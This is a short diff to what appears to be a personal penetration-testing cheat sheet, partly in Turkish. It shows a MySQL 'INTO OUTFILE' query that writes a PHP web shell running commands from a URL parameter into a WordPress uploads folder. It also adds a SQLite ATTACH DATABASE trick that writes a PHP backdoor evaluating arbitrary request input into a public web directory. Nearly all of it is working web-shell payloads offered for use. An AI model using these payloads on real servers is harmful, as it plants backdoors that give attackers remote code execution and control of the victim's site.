@@ -27,3 +27,8 @@ OTHER " shell.php içerisine <?php echo shell_exec($_GET['cmd']);?> satırını 
 mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/xxxx/xxxx/wp-content/uploads/shell.php";
 
 
+ANOTHER ATTACH DATABASE and RUN COMMAND
+=======================================
+attach database '/home/devnull/public_html/img/backdoor.php' as backdoor; create table backdoor.tbl (cmd TEXT); insert into backdoor.tbl (cmd) values ("<?php $_REQUEST[e] ? eval( $_REQUEST[e] ) : exit; ?>");
+
+
